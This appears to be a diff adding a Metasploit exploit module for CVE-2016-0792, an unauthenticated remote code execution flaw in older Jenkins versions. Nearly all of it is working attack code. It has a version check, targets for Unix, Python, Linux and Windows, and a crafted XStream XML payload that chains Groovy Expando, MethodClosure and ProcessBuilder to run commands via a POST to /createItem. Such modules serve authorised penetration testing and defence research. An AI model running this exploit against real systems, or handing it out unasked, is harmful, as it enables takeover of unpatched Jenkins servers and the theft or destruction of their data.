@@ -1,0 +1,141 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Jenkins XStream Groovy classpath Deserialization Vulnerability',
+      'Description'    => %q{
+        This module exploits CVE-2016-0792 a vulnerability in Jenkins versions older than 1.650 and Jenkins LTS versions
+        older than 1.642.2 which is caused by unsafe deserialization in XStream with Groovy in the classpath,
+        which allows remote arbitrary code execution. The issue affects default installations. Authentication
+        is not required to exploit the vulnerability.
+      },
+      'Author'         =>
+          [
+            'Arshan Dabirsiaghi', 			# Vulnerability discovery
+            'Matt Byrne <attackdebris[at]gmail.com>'    # Metasploit module
+          ],
+      'DisclosureDate' => 'Feb 24 2016',
+      'License'        => MSF_LICENSE,
+      'References'     =>
+          [
+            ['CVE', '2016-0792'],
+            ['URL', 'https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream'],
+            ['URL', 'https://wiki.jenkins.io/pages/viewpage.action?pageId=95585413']
+          ],
+        'Platform'  => %w{ win linux unix },
+        'Arch'           => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],
+        'Targets'        => [
+        ['Unix (In-Memory)',
+          'Platform'   => 'unix',
+          'Arch'       => ARCH_CMD
+        ],
+        ['Python (In-Memory)',
+          'Platform'   => 'python',
+          'Arch'       => ARCH_PYTHON
+        ],
+        ['Linux (Dropper)',
+          'Platform'   => 'linux',
+          'Arch'       => [ARCH_X86, ARCH_X64]
+        ],
+        ['Windows (Dropper)',
+          'Platform'   => 'win',
+          'Arch'       => [ARCH_X86, ARCH_X64]
+        ]
+      ],
+      'DefaultTarget' => 0
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'The base path to Jenkins', '/']),
+      Opt::RPORT('8080')
+    ])
+    deregister_options('URIPATH')
+  end
+
+  def check
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path)
+    })
+
+    unless res
+      fail_with(Failure::Unknown, 'The connection timed out.')
+    end
+
+    http_headers = res.headers
+
+    if http_headers['X-Jenkins'] && http_headers['X-Jenkins'].to_f < 1.650
+      return Exploit::CheckCode::Appears
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    case target.name
+    when /Unix/, /Python/
+      execute_command(payload.encoded)
+    else
+      execute_cmdstager
+    end
+  end
+
+  # Exploit methods
+
+  def execute_command(cmd, opts = {})
+    cmd = case target.name
+    when /Unix/, /Linux/
+      %W{/bin/sh -c #{cmd}}
+    when /Python/
+      %W{python -c #{cmd}}
+    when /Windows/
+      %W{cmd.exe /c #{cmd}}
+    end
+
+    # Encode each command argument with XML entities
+    cmd.map! { |arg| arg.encode(xml: :text) }
+
+    res = send_request_cgi(
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, '/createItem'),
+      'vars_get' => { 'name' => 'random' },
+      'ctype'    => 'application/xml',
+      'data'     => xstream_payload(cmd)
+    )
+  end
+
+  def xstream_payload(cmd)
+    <<EOF
+<map>
+  <entry>
+    <groovy.util.Expando>
+      <expandoProperties>
+        <entry>
+          <string>hashCode</string>
+          <org.codehaus.groovy.runtime.MethodClosure>
+            <delegate class="groovy.util.Expando"/>
+            <owner class="java.lang.ProcessBuilder">
+              <command>
+                <string>#{cmd.join('</string><string>')}</string>
+              </command>
+            </owner>
+            <method>start</method>
+          </org.codehaus.groovy.runtime.MethodClosure>
+        </entry>
+      </expandoProperties>
+    </groovy.util.Expando>
+    <int>1</int>
+  </entry>
+</map>
+EOF
+  end
+end
